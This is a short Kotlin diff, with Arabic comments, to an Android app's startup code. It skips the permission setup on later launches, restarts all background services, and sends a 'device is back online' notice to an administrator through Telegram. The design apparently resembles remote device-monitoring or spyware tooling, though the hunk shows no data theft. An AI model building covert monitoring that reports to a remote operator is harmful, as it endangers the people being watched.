@@ -179,6 +179,27 @@ class MainActivity : AppCompatActivity() {
         initLogger(this)
         debugLog("=== بدء التطبيق ===")
         debugLog("الموديل: ${Build.MODEL} | أندرويد: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
+
+        // === فحص استمرارية الجلسة - إذا كان التفعيل مكتمل سابقاً، لا نكرر الأذونات ===
+        if (SharedPrefsManager.isSetupCompleted(this) && SharedPrefsManager.getLinkCode(this) != null) {
+            debugLog("✅ التفعيل مكتمل سابقاً - تخطي الأذونات وبدء الخدمات مباشرة")
+            isSetupComplete = true
+            val deviceInfo = buildDeviceInfoHtml()
+            jsCall("onAllPermissionsComplete('$deviceInfo')")
+            jsCall("onTelegramConnected('تم الاتصال بتيليجرام بنجاح')")
+            startAllServices()
+            ensureDeviceId()
+            // إرسال إشعار للمدير بأن الجهاز عاد للعمل
+            CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
+                try {
+                    TelegramDirectClient.sendStartupNotification(this@MainActivity)
+                } catch (e: Exception) {
+                    debugLog("خطأ في إرسال إشعار العودة: ${e.message}")
+                }
+            }
+            return
+        }
+
         currentStep = SetupStep.BASIC_RUNTIME
         isSetupComplete = false
         checkAndRequestPermissions()
